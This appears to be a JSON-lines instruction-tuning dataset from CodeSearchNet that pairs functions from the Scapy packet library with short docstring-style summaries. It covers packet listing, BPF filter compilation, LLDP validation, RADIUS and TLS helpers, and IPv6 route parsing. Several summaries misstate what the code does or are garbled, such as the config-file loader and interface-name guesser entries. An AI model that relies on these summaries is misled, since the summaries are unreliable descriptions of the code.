{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef hexraw(self, lfilter=None):\n        for i, res in enumerate(self.res):\n            p = self._elt2pkt(res)\n            if lfilter is not None and not lfilter(p):\n                continue\n            print(\"%s %s %s\" % (conf.color_theme.id(i, fmt=\"%04i\"),\n                                p.sprintf(\"%.time%\"),\n                                self._elt2sum(res)))\n            if p.haslayer(conf.raw_layer):\n                hexdump(p.getlayer(conf.raw_layer).load)", "response": "Print the hexdump of all the related objects in the packet."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nprinting the hexdump of the contents of the object.", "response": "def hexdump(self, lfilter=None):\n        \"\"\"Same as nsummary(), except that packets are also hexdumped\n        lfilter: a truth function that decides whether a packet must be displayed\"\"\"  # noqa: E501\n        for i, res in enumerate(self.res):\n            p = self._elt2pkt(res)\n            if lfilter is not None and not lfilter(p):\n                continue\n            print(\"%s %s %s\" % (conf.color_theme.id(i, fmt=\"%04i\"),\n                                p.sprintf(\"%.time%\"),\n                                self._elt2sum(res)))\n            hexdump(p)"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ngraph a conversations between source and destination IP and ARP layers and displays them as a graphviz graph.", "response": "def conversations(self, getsrcdst=None, **kargs):\n        \"\"\"Graphes a conversations between sources and destinations and display it\n        (using graphviz and imagemagick)\n        getsrcdst: a function that takes an element of the list and\n                   returns the source, the destination and optionally\n                   a label. By default, returns the IP source and\n                   destination from IP and ARP layers\n        type: output type (svg, ps, gif, jpg, etc.), passed to dot's \"-T\" option  # noqa: E501\n        target: filename or redirect. Defaults pipe to Imagemagick's display program  # noqa: E501\n        prog: which graphviz program to use\"\"\"\n        if getsrcdst is None:\n            def getsrcdst(pkt):\n                \"\"\"Extract src and dst addresses\"\"\"\n                if 'IP' in pkt:\n                    return (pkt['IP'].src, pkt['IP'].dst)\n                if 'IPv6' in pkt:\n                    return (pkt['IPv6'].src, pkt['IPv6'].dst)\n                if 'ARP' in pkt:\n                    return (pkt['ARP'].psrc, pkt['ARP'].pdst)\n                raise TypeError()\n        conv = {}\n        for p in self.res:\n            p = self._elt2pkt(p)\n            try:\n                c = getsrcdst(p)\n            except Exception:\n                # No warning here: it's OK that getsrcdst() raises an\n                # exception, since it might be, for example, a\n                # function that expects a specific layer in each\n                # packet. The try/except approach is faster and\n                # considered more Pythonic than adding tests.\n                continue\n            if len(c) == 3:\n                conv.setdefault(c[:2], set()).add(c[2])\n            else:\n                conv[c] = conv.get(c, 0) + 1\n        gr = 'digraph \"conv\" {\\n'\n        for (s, d), l in six.iteritems(conv):\n            gr += '\\t \"%s\" -> \"%s\" [label=\"%s\"]\\n' % (\n                s, d, ', '.join(str(x) for x in l) if isinstance(l, set) else l\n            )\n        gr += \"}\\n\"\n        return do_graph(gr, **kargs)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef replace(self, *args, **kargs):\n        delete_checksums = kargs.get(\"delete_checksums\", False)\n        x = PacketList(name=\"Replaced %s\" % self.listname)\n        if not isinstance(args[0], tuple):\n            args = (args,)\n        for p in self.res:\n            p = self._elt2pkt(p)\n            copied = False\n            for scheme in args:\n                fld = scheme[0]\n                old = scheme[1]  # not used if len(scheme) == 2\n                new = scheme[-1]\n                for o in fld.owners:\n                    if o in p:\n                        if len(scheme) == 2 or p[o].getfieldval(fld.name) == old:  # noqa: E501\n                            if not copied:\n                                p = p.copy()\n                                if delete_checksums:\n                                    p.delete_checksums()\n                                copied = True\n                            setattr(p[o], fld.name, new)\n            x.append(p)\n        return x", "response": "Replace the entries in the list with the ones in args."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _check_tcpdump():\n    with open(os.devnull, 'wb') as devnull:\n        try:\n            proc = subprocess.Popen([conf.prog.tcpdump, \"--version\"],\n                                    stdout=devnull, stderr=subprocess.STDOUT)\n        except OSError:\n            return False\n\n    if OPENBSD:\n        # 'tcpdump --version' returns 1 on OpenBSD 6.4\n        return proc.wait() == 1\n    else:\n        return proc.wait() == 0", "response": "Check if tcpdump command can be started"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_if(iff, cmd):\n\n    sck = socket.socket()\n    ifreq = ioctl(sck, cmd, struct.pack(\"16s16x\", iff.encode(\"utf8\")))\n    sck.close()\n    return ifreq", "response": "Ease SIOCGIF * ioctl calls"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _legacy_bpf_pointer(tcpdump_lines):\n    X86_64 = os.uname()[4] in ['x86_64', 'aarch64']\n    size = int(tcpdump_lines[0])\n    bpf = b\"\"\n    for l in tcpdump_lines[1:]:\n        if six.PY2:\n            int_type = long  # noqa: F821\n        else:\n            int_type = int\n        bpf += struct.pack(\"HBBI\", *map(int_type, l.split()))\n\n    # Thanks to http://www.netprojects.de/scapy-with-pypy-solved/ for the pypy trick  # noqa: E501\n    if conf.use_pypy:\n        str_buffer = ctypes.create_string_buffer(bpf)\n        return struct.pack('HL', size, ctypes.addressof(str_buffer))\n    else:\n        # XXX. Argl! We need to give the kernel a pointer on the BPF,\n        # Python object header seems to be 20 bytes. 36 bytes for x86 64bits arch.  # noqa: E501\n        if X86_64:\n            return struct.pack(\"HL\", size, id(bpf) + 36)\n        else:\n            return struct.pack(\"HI\", size, id(bpf) + 20)", "response": "Get old - format BPF Pointer. Deprecated."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_bpf_pointer(tcpdump_lines):\n    if conf.use_pypy:\n        return _legacy_bpf_pointer(tcpdump_lines)\n\n    # Allocate BPF instructions\n    size = int(tcpdump_lines[0])\n    bpf_insn_a = bpf_insn * size\n    bip = bpf_insn_a()\n\n    # Fill the BPF instruction structures with the byte code\n    tcpdump_lines = tcpdump_lines[1:]\n    i = 0\n    for line in tcpdump_lines:\n        values = [int(v) for v in line.split()]\n        bip[i].code = c_ushort(values[0])\n        bip[i].jt = c_ubyte(values[1])\n        bip[i].jf = c_ubyte(values[2])\n        bip[i].k = c_uint(values[3])\n        i += 1\n\n    # Create the BPF program\n    return bpf_program(size, bip)", "response": "Create a BPF Pointer for TCPDump filter"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef compile_filter(bpf_filter, iface=None):\n    if not TCPDUMP:\n        raise Scapy_Exception(\"tcpdump is not available. Cannot use filter !\")\n    try:\n        process = subprocess.Popen([\n            conf.prog.tcpdump,\n            \"-p\",\n            \"-i\", (conf.iface if iface is None else iface),\n            \"-ddd\",\n            \"-s\", str(MTU),\n            bpf_filter],\n            stdout=subprocess.PIPE,\n            stderr=subprocess.PIPE\n        )\n    except OSError as ex:\n        raise Scapy_Exception(\"Failed to attach filter: %s\" % ex)\n    lines, err = process.communicate()\n    ret = process.returncode\n    if ret:\n        raise Scapy_Exception(\n            \"Failed to attach filter: tcpdump returned: %s\" % err\n        )\n    lines = lines.strip().split(b\"\\n\")\n    return get_bpf_pointer(lines)", "response": "Asks Tcpdump to parse the filter then build the matching BPF bytecode using get_bpf_pointer."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _ldp_id_adjustlen(pkt, x):\n    f, v = pkt.getfield_and_val('id')\n    return len(_LLDPidField.i2m(f, pkt, v)) + 1", "response": "Return the length of the id field according to its real encoded type"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ncalculating size of lower dot1q headers in a layer", "response": "def _dot1q_headers_size(layer):\n        \"\"\"\n        calculate size of lower dot1q layers (if present)\n        :param layer: the layer to start at\n        :return: size of vlan headers, layer below lowest vlan header\n        \"\"\"\n\n        vlan_headers_size = 0\n        under_layer = layer\n\n        while under_layer and isinstance(under_layer, Dot1Q):\n            vlan_headers_size += LLDPDU.DOT1Q_HEADER_LEN\n            under_layer = under_layer.underlayer\n\n        return vlan_headers_size, under_layer"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _frame_structure_check(structure_description):\n\n        standard_frame_structure = [LLDPDUChassisID.__name__,\n                                    LLDPDUPortID.__name__,\n                                    LLDPDUTimeToLive.__name__,\n                                    '<...>',\n                                    LLDPDUEndOfLLDPDU.__name__]\n\n        if len(structure_description) < 4:\n            raise LLDPInvalidFrameStructure(\n                'Invalid frame structure.\\ngot: {}\\nexpected: '\n                '{}'.format(' '.join(structure_description),\n                            ' '.join(standard_frame_structure)))\n\n        for idx, layer_name in enumerate(standard_frame_structure):\n\n            if layer_name == '<...>':\n                break\n            if layer_name != structure_description[idx]:\n                raise LLDPInvalidFrameStructure(\n                    'Invalid frame structure.\\ngot: {}\\nexpected: '\n                    '{}'.format(' '.join(structure_description),\n                                ' '.join(standard_frame_structure)))\n\n        if structure_description[-1] != standard_frame_structure[-1]:\n            raise LLDPInvalidFrameStructure(\n                'Invalid frame structure.\\ngot: {}\\nexpected: '\n                '{}'.format(' '.join(structure_description),\n                            ' '.join(standard_frame_structure)))", "response": "check if the structure of the frame is conform to the basic LLDP - msg structure"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nchecks if multiplicity of present TLVs conforms to the standard.", "response": "def _tlv_multiplicities_check(tlv_type_count):\n        \"\"\"\n        check if multiplicity of present TLVs conforms to the standard\n        :param tlv_type_count: dict containing counte-per-TLV\n        \"\"\"\n\n        # * : 0..n, 1 : one and only one.\n        standard_multiplicities = {\n            LLDPDUEndOfLLDPDU.__name__: 1,\n            LLDPDUChassisID.__name__: 1,\n            LLDPDUPortID.__name__: 1,\n            LLDPDUTimeToLive.__name__: 1,\n            LLDPDUPortDescription: '*',\n            LLDPDUSystemName: '*',\n            LLDPDUSystemDescription: '*',\n            LLDPDUSystemCapabilities: '*',\n            LLDPDUManagementAddress: '*'\n        }\n\n        for tlv_type_name in standard_multiplicities:\n\n            standard_tlv_multiplicity = \\\n                standard_multiplicities[tlv_type_name]\n            if standard_tlv_multiplicity == '*':\n                continue\n\n            try:\n                if tlv_type_count[tlv_type_name] != standard_tlv_multiplicity:\n                    raise LLDPInvalidTLVCount(\n                        'Invalid number of entries for TLV type '\n                        '{} - expected {} entries, got '\n                        '{}'.format(tlv_type_name,\n                                    standard_tlv_multiplicity,\n                                    tlv_type_count[tlv_type_name]))\n\n            except KeyError:\n                raise LLDPInvalidTLVCount('Missing TLV layer of type '\n                                          '{}.'.format(tlv_type_name))"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _check(self):\n        if conf.contribs['LLDP'].strict_mode() and self._length != 2:\n            raise LLDPInvalidLengthField('length must be 2 - got '\n                                         '{}'.format(self._length))", "response": "run layer specific checks\nxn"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _check(self):\n        if conf.contribs['LLDP'].strict_mode():\n            management_address_len = len(self.management_address)\n            if management_address_len == 0 or management_address_len > 31:\n                raise LLDPInvalidLengthField(\n                    'management address must be  1..31 characters long - '\n                    'got string of size {}'.format(management_address_len))", "response": "run layer specific checks\n           "}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef GetIcmpStatistics():\n    statistics = MIB_ICMP()\n    _GetIcmpStatistics(byref(statistics))\n    results = _struct_to_dict(statistics)\n    del(statistics)\n    return results", "response": "Return all Windows ICMP stats from iphlpapi"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ngetting all Windows Adapters addresses from iphlpapi", "response": "def GetAdaptersAddresses(AF=AF_UNSPEC):\n    \"\"\"Return all Windows Adapters addresses from iphlpapi\"\"\"\n    # We get the size first\n    size = ULONG()\n    flags = GAA_FLAG_INCLUDE_PREFIX\n    res = _GetAdaptersAddresses(AF, flags,\n                                None, None,\n                                byref(size))\n    if res != 0x6f:  # BUFFER OVERFLOW -> populate size\n        raise RuntimeError(\"Error getting structure length (%d)\" % res)\n    # Now let's build our buffer\n    pointer_type = POINTER(IP_ADAPTER_ADDRESSES)\n    buffer = create_string_buffer(size.value)\n    AdapterAddresses = ctypes.cast(buffer, pointer_type)\n    # And call GetAdaptersAddresses\n    res = _GetAdaptersAddresses(AF, flags,\n                                None, AdapterAddresses,\n                                byref(size))\n    if res != NO_ERROR:\n        raise RuntimeError(\"Error retrieving table (%d)\" % res)\n    results = _resolve_list(AdapterAddresses)\n    del(AdapterAddresses)\n    return results"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef GetIpForwardTable():\n    # We get the size first\n    size = ULONG()\n    res = _GetIpForwardTable(None, byref(size), False)\n    if res != 0x7a:  # ERROR_INSUFFICIENT_BUFFER -> populate size\n        raise RuntimeError(\"Error getting structure length (%d)\" % res)\n    # Now let's build our buffer\n    pointer_type = PMIB_IPFORWARDTABLE\n    buffer = create_string_buffer(size.value)\n    pIpForwardTable = ctypes.cast(buffer, pointer_type)\n    # And call GetAdaptersAddresses\n    res = _GetIpForwardTable(pIpForwardTable, byref(size), True)\n    if res != NO_ERROR:\n        raise RuntimeError(\"Error retrieving table (%d)\" % res)\n    results = []\n    for i in range(pIpForwardTable.contents.NumEntries):\n        results.append(_struct_to_dict(pIpForwardTable.contents.Table[i]))\n    del(pIpForwardTable)\n    return results", "response": "Get all Windows routes from iphlpapi"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef GetIpForwardTable2(AF=AF_UNSPEC):\n    if WINDOWS_XP:\n        raise OSError(\"Not available on Windows XP !\")\n    table = PMIB_IPFORWARD_TABLE2()\n    res = _GetIpForwardTable2(AF, byref(table))\n    if res != NO_ERROR:\n        raise RuntimeError(\"Error retrieving table (%d)\" % res)\n    results = []\n    for i in range(table.contents.NumEntries):\n        results.append(_struct_to_dict(table.contents.Table[i]))\n    _FreeMibTable(table)\n    return results", "response": "Return all Windows routes from iphlpapi"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef encrypt(self, data):\n        if False in six.itervalues(self.ready):\n            raise CipherError(data)\n        encryptor = self._cipher.encryptor()\n        tmp = encryptor.update(data) + encryptor.finalize()\n        self.iv = tmp[-self.block_size:]\n        return tmp", "response": "Encrypt the data. Also, update the cipher iv. This is needed for SSLv3\n        and TLS 1.0. For TLS 1.1/1.2, it is overwritten in TLS.post_build()."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\npacks RADIUS data prior computing the authentication MAC", "response": "def prepare_packed_data(radius_packet, packed_req_authenticator):\n    \"\"\"\n    Pack RADIUS data prior computing the authentication MAC\n    \"\"\"\n\n    packed_hdr = struct.pack(\"!B\", radius_packet.code)\n    packed_hdr += struct.pack(\"!B\", radius_packet.id)\n    packed_hdr += struct.pack(\"!H\", radius_packet.len)\n\n    packed_attrs = b''\n    for attr in radius_packet.attributes:\n        packed_attrs += raw(attr)\n\n    return packed_hdr + packed_req_authenticator + packed_attrs"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef register_variant(cls):\n\n        if hasattr(cls, \"val\"):\n            cls.registered_attributes[cls.val] = cls\n        else:\n            cls.registered_attributes[cls.type.default] = cls", "response": "Registers the RADIUS attributes defined in this module."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ndispatch the given class to the right RadiusAttribute class.", "response": "def dispatch_hook(cls, _pkt=None, *args, **kargs):\n        \"\"\"\n        Returns the right RadiusAttribute class for the given data.\n        \"\"\"\n\n        if _pkt:\n            attr_type = orb(_pkt[0])\n            return cls.registered_attributes.get(attr_type, cls)\n        return cls"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef compute_message_authenticator(radius_packet, packed_req_authenticator,\n                                      shared_secret):\n        \"\"\"\n        Computes the \"Message-Authenticator\" of a given RADIUS packet.\n        \"\"\"\n\n        data = prepare_packed_data(radius_packet, packed_req_authenticator)\n        radius_hmac = hmac.new(shared_secret, data, hashlib.md5)\n\n        return radius_hmac.digest()", "response": "Computes the Message - Authenticator of a given RADIUS packet."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef compute_authenticator(self, packed_request_auth, shared_secret):\n\n        data = prepare_packed_data(self, packed_request_auth)\n        radius_mac = hashlib.md5(data + shared_secret)\n        return radius_mac.digest()", "response": "Computes the authenticator field based on the request auth and shared secret."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef do_build(self):\n        tmp = self.explicit\n        self.explicit = True\n        b = super(KeyShareEntry, self).do_build()\n        self.explicit = tmp\n        return b", "response": "This method is used to build the key share entry."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef create_privkey(self):\n        if self.group in _tls_named_ffdh_groups:\n            params = _ffdh_groups[_tls_named_ffdh_groups[self.group]][0]\n            privkey = params.generate_private_key()\n            self.privkey = privkey\n            pubkey = privkey.public_key()\n            self.key_exchange = pubkey.public_numbers().y\n        elif self.group in _tls_named_curves:\n            if _tls_named_curves[self.group] == \"x25519\":\n                if conf.crypto_valid_advanced:\n                    privkey = x25519.X25519PrivateKey.generate()\n                    self.privkey = privkey\n                    pubkey = privkey.public_key()\n                    self.key_exchange = pubkey.public_bytes()\n            elif _tls_named_curves[self.group] != \"x448\":\n                curve = ec._CURVE_TYPES[_tls_named_curves[self.group]]()\n                privkey = ec.generate_private_key(curve, default_backend())\n                self.privkey = privkey\n                pubkey = privkey.public_key()\n                try:\n                    # cryptography >= 2.5\n                    self.key_exchange = pubkey.public_bytes(\n                        serialization.Encoding.X962,\n                        serialization.PublicFormat.UncompressedPoint\n                    )\n                except TypeError:\n                    # older versions\n                    self.key_exchange = pubkey.public_numbers().encode_point()", "response": "This method creates a private key for the current class."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _guess_iface_name(netif):\n    with os.popen('%s -l' % conf.prog.ifconfig) as fdesc:\n        ifaces = fdesc.readline().strip().split(' ')\n    matches = [iface for iface in ifaces if iface.startswith(netif)]\n    if len(matches) == 1:\n        return matches[0]\n    return None", "response": "Try to guess the name of the interface that is truncated from the ifconfig output of ifconfig - l. If there is only one possible candidate then we return None."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreturning a list of IPv6 addresses configured on the interface ifname.", "response": "def _in6_getifaddr(ifname):\n    \"\"\"\n    Returns a list of IPv6 addresses configured on the interface ifname.\n    \"\"\"\n\n    # Get the output of ifconfig\n    try:\n        f = os.popen(\"%s %s\" % (conf.prog.ifconfig, ifname))\n    except OSError:\n        log_interactive.warning(\"Failed to execute ifconfig.\")\n        return []\n\n    # Iterate over lines and extract IPv6 addresses\n    ret = []\n    for line in f:\n        if \"inet6\" in line:\n            addr = line.rstrip().split(None, 2)[1]  # The second element is the IPv6 address  # noqa: E501\n        else:\n            continue\n        if '%' in line:  # Remove the interface identifier if present\n            addr = addr.split(\"%\", 1)[0]\n\n        # Check if it is a valid IPv6 address\n        try:\n            inet_pton(socket.AF_INET6, addr)\n        except (socket.error, ValueError):\n            continue\n\n        # Get the scope and keep the address\n        scope = in6_getscope(addr)\n        ret.append((addr, scope, ifname))\n\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef in6_getifaddr():\n\n    # List all network interfaces\n    if OPENBSD:\n        try:\n            f = os.popen(\"%s\" % conf.prog.ifconfig)\n        except OSError:\n            log_interactive.warning(\"Failed to execute ifconfig.\")\n            return []\n\n        # Get the list of network interfaces\n        splitted_line = []\n        for l in f:\n            if \"flags\" in l:\n                iface = l.split()[0].rstrip(':')\n                splitted_line.append(iface)\n\n    else:  # FreeBSD, NetBSD or Darwin\n        try:\n            f = os.popen(\"%s -l\" % conf.prog.ifconfig)\n        except OSError:\n            log_interactive.warning(\"Failed to execute ifconfig.\")\n            return []\n\n        # Get the list of network interfaces\n        splitted_line = f.readline().rstrip().split()\n\n    ret = []\n    for i in splitted_line:\n        ret += _in6_getifaddr(i)\n    return ret", "response": "Get the list of addresses of all interfaces associated to the interface in the system."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef read_routes6():\n\n    # Call netstat to retrieve IPv6 routes\n    fd_netstat = os.popen(\"netstat -rn -f inet6\")\n\n    # List interfaces IPv6 addresses\n    lifaddr = in6_getifaddr()\n    if not lifaddr:\n        return []\n\n    # Routes header information\n    got_header = False\n    mtu_present = False\n    prio_present = False\n\n    # Parse the routes\n    routes = []\n    for line in fd_netstat.readlines():\n\n        # Parse the routes header and try to identify extra columns\n        if not got_header:\n            if \"Destination\" == line[:11]:\n                got_header = True\n                mtu_present = \"Mtu\" in line\n                prio_present = \"Prio\" in line\n            continue\n\n        # Parse a route entry according to the operating system\n        splitted_line = line.split()\n        if OPENBSD or NETBSD:\n            index = 5 + mtu_present + prio_present\n            if len(splitted_line) < index:\n                warning(\"Not enough columns in route entry !\")\n                continue\n            destination, next_hop, flags = splitted_line[:3]\n            dev = splitted_line[index]\n        else:\n            # FREEBSD or DARWIN\n            if len(splitted_line) < 4:\n                warning(\"Not enough columns in route entry !\")\n                continue\n            destination, next_hop, flags, dev = splitted_line[:4]\n\n        # XXX: TODO: add metrics for unix.py (use -e option on netstat)\n        metric = 1\n\n        # Check flags\n        if \"U\" not in flags:  # usable route\n            continue\n        if \"R\" in flags:  # Host or net unreachable\n            continue\n        if \"m\" in flags:  # multicast address\n            # Note: multicast routing is handled in Route6.route()\n            continue\n\n        # Replace link with the default route in next_hop\n        if \"link\" in next_hop:\n            next_hop = \"::\"\n\n        # Default prefix length\n        destination_plen = 128\n\n        # Extract network interface from the zone id\n        if '%' in destination:\n            destination, dev = destination.split('%')\n            if '/' in dev:\n                # Example: fe80::%lo0/64 ; dev = \"lo0/64\"\n                dev, destination_plen = dev.split('/')\n        if '%' in next_hop:\n            next_hop, dev = next_hop.split('%')\n\n        # Ensure that the next hop is a valid IPv6 address\n        if not in6_isvalid(next_hop):\n            # Note: the 'Gateway' column might contain a MAC address\n            next_hop = \"::\"\n\n        # Modify parsed routing entries\n        # Note: these rules are OS specific and may evolve over time\n        if destination == \"default\":\n            destination, destination_plen = \"::\", 0\n        elif '/' in destination:\n            # Example: fe80::/10\n            destination, destination_plen = destination.split('/')\n        if '/' in dev:\n            # Example: ff02::%lo0/32 ; dev = \"lo0/32\"\n            dev, destination_plen = dev.split('/')\n\n        # Check route entries parameters consistency\n        if not in6_isvalid(destination):\n            warning(\"Invalid destination IPv6 address in route entry !\")\n            continue\n        try:\n            destination_plen = int(destination_plen)\n        except Exception:\n            warning(\"Invalid IPv6 prefix length in route entry !\")\n            continue\n        if in6_ismlladdr(destination) or in6_ismnladdr(destination):\n            # Note: multicast routing is handled in Route6.route()\n            continue\n\n        if LOOPBACK_NAME in dev:\n            # Handle ::1 separately\n            cset = [\"::1\"]\n            next_hop = \"::\"\n        else:\n            # Get possible IPv6 source addresses\n            devaddrs = (x for x in lifaddr if x[2] == dev)\n            cset = construct_source_candidate_set(destination, destination_plen, devaddrs)  # noqa: E501\n\n        if len(cset):\n            routes.append((destination, destination_plen, next_hop, dev, cset, metric))  # noqa: E501\n\n    fd_netstat.close()\n    return routes", "response": "Reads IPv6 routes from netstat and returns a list of IPv6 routes than can be used by Scapy."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _read_config_file(cf, _globals=globals(), _locals=locals(), interactive=True):  # noqa: E501\n    log_loading.debug(\"Loading config file [%s]\", cf)\n    try:\n        exec(compile(open(cf).read(), cf, 'exec'), _globals, _locals)\n    except IOError as e:\n        if interactive:\n            raise\n        log_loading.warning(\"Cannot read config file [%s] [%s]\", cf, e)\n    except Exception:\n        if interactive:\n            raise\n        log_loading.exception(\"Error during evaluation of config file [%s]\", cf)", "response": "Read a config file and return a tuple of the base classes that can be used to instantiate the appropriate class."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nload a Python module to make variables objects and functions available globally.", "response": "def _load(module, globals_dict=None, symb_list=None):\n    \"\"\"Loads a Python module to make variables, objects and functions\navailable globally.\n\n    The idea is to load the module using importlib, then copy the\nsymbols to the global symbol table.\n\n    \"\"\"\n    if globals_dict is None:\n        globals_dict = six.moves.builtins.__dict__\n    try:\n        mod = importlib.import_module(module)\n        if '__all__' in mod.__dict__:\n            # import listed symbols\n            for name in mod.__dict__['__all__']:\n                if symb_list is not None:\n                    symb_list.append(name)\n                globals_dict[name] = mod.__dict__[name]\n        else:\n            # only import non-private symbols\n            for name, sym in six.iteritems(mod.__dict__):\n                if _validate_local(name):\n                    if symb_list is not None:\n                        symb_list.append(name)\n                    globals_dict[name] = sym\n    except Exception:\n        log_interactive.error(\"Loading module %s\", module, exc_info=True)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef load_module(name, globals_dict=None, symb_list=None):\n    _load(\"scapy.modules.\" + name,\n          globals_dict=globals_dict, symb_list=symb_list)", "response": "Loads a Scapy module to make variables objects and functions available globally."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef load_layer(name, globals_dict=None, symb_list=None):\n    _load(\"scapy.layers.\" + LAYER_ALIASES.get(name, name),\n          globals_dict=globals_dict, symb_list=symb_list)", "response": "Loads a Scapy layer module to make variables objects and functions\n    available globally."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nloads a Scapy contrib module to make variables objects and functions available globally.", "response": "def load_contrib(name, globals_dict=None, symb_list=None):\n    \"\"\"Loads a Scapy contrib module to make variables, objects and\n    functions available globally.\n\n    If no contrib module can be found with the given name, try to find\n    a layer module, since a contrib module may become a layer module.\n\n    \"\"\"\n    try:\n        importlib.import_module(\"scapy.contrib.\" + name)\n        _load(\"scapy.contrib.\" + name,\n              globals_dict=globals_dict, symb_list=symb_list)\n    except ImportError as e:\n        # if layer not found in contrib, try in layers\n        try:\n            load_layer(name,\n                       globals_dict=globals_dict, symb_list=symb_list)\n        except ImportError:\n            raise e"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nshow the list of all existing contribs.", "response": "def list_contrib(name=None, ret=False, _debug=False):\n    \"\"\"Show the list of all existing contribs.\n    Params:\n     - name: filter to search the contribs\n     - ret: whether the function should return a dict instead of printing it\n    \"\"\"\n    # _debug: checks that all contrib modules have correctly defined:\n    # # scapy.contrib.description = [...]\n    # # scapy.contrib.status = [...]\n    # # scapy.contrib.name = [...] (optional)\n    # or set the flag:\n    # # scapy.contrib.description = skip\n    # to skip the file\n    if name is None:\n        name = \"*.py\"\n    elif \"*\" not in name and \"?\" not in name and not name.endswith(\".py\"):\n        name += \".py\"\n    results = []\n    dir_path = os.path.join(os.path.dirname(__file__), \"contrib\")\n    if sys.version_info >= (3, 5):\n        name = os.path.join(dir_path, \"**\", name)\n        iterator = glob.iglob(name, recursive=True)\n    else:\n        name = os.path.join(dir_path, name)\n        iterator = glob.iglob(name)\n    for f in iterator:\n        mod = f.replace(os.path.sep, \".\").partition(\"contrib.\")[2]\n        if mod.startswith(\"__\"):\n            continue\n        if mod.endswith(\".py\"):\n            mod = mod[:-3]\n        desc = {\"description\": None, \"status\": None, \"name\": mod}\n        for l in io.open(f, errors=\"replace\"):\n            if l[0] != \"#\":\n                continue\n            p = l.find(\"scapy.contrib.\")\n            if p >= 0:\n                p += 14\n                q = l.find(\"=\", p)\n                key = l[p:q].strip()\n                value = l[q + 1:].strip()\n                desc[key] = value\n            if desc[\"status\"] == \"skip\":\n                break\n            if desc[\"description\"] and desc[\"status\"]:\n                results.append(desc)\n                break\n        if _debug:\n            if desc[\"status\"] == \"skip\":\n                pass\n            elif not desc[\"description\"] or not desc[\"status\"]:\n                raise Scapy_Exception(\"Module %s is missing its \"\n                                      \"contrib infos !\" % mod)\n    results.sort(key=lambda x: x[\"name\"])\n    if ret:\n        return results\n    else:\n        for desc in results:\n            print(\"%(name)-20s: %(description)-40s status=%(status)s\" % desc)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nsaving the current Scapy session to the file specified in fname.", "response": "def save_session(fname=None, session=None, pickleProto=-1):\n    \"\"\"Save current Scapy session to the file specified in the fname arg.\n\n    params:\n     - fname: file to save the scapy session in\n     - session: scapy session to use. If None, the console one will be used\n     - pickleProto: pickle proto version (default: -1 = latest)\"\"\"\n    from scapy import utils\n    if fname is None:\n        fname = conf.session\n        if not fname:\n            conf.session = fname = utils.get_temp_file(keep=True)\n    log_interactive.info(\"Use [%s] as session file\" % fname)\n\n    if session is None:\n        try:\n            session = get_ipython().user_ns\n        except Exception:\n            session = six.moves.builtins.__dict__[\"scapy_session\"]\n\n    to_be_saved = session.copy()\n    if \"__builtins__\" in to_be_saved:\n        del(to_be_saved[\"__builtins__\"])\n\n    for k in list(to_be_saved):\n        i = to_be_saved[k]\n        if hasattr(i, \"__module__\") and (k[0] == \"_\" or i.__module__.startswith(\"IPython\")):  # noqa: E501\n            del(to_be_saved[k])\n        if isinstance(i, ConfClass):\n            del(to_be_saved[k])\n        elif isinstance(i, (type, type, types.ModuleType)):\n            if k[0] != \"_\":\n                log_interactive.error(\"[%s] (%s) can't be saved.\", k, type(to_be_saved[k]))  # noqa: E501\n            del(to_be_saved[k])\n\n    try:\n        os.rename(fname, fname + \".bak\")\n    except OSError:\n        pass\n\n    f = gzip.open(fname, \"wb\")\n    six.moves.cPickle.dump(to_be_saved, f, pickleProto)\n    f.close()\n    del f"}
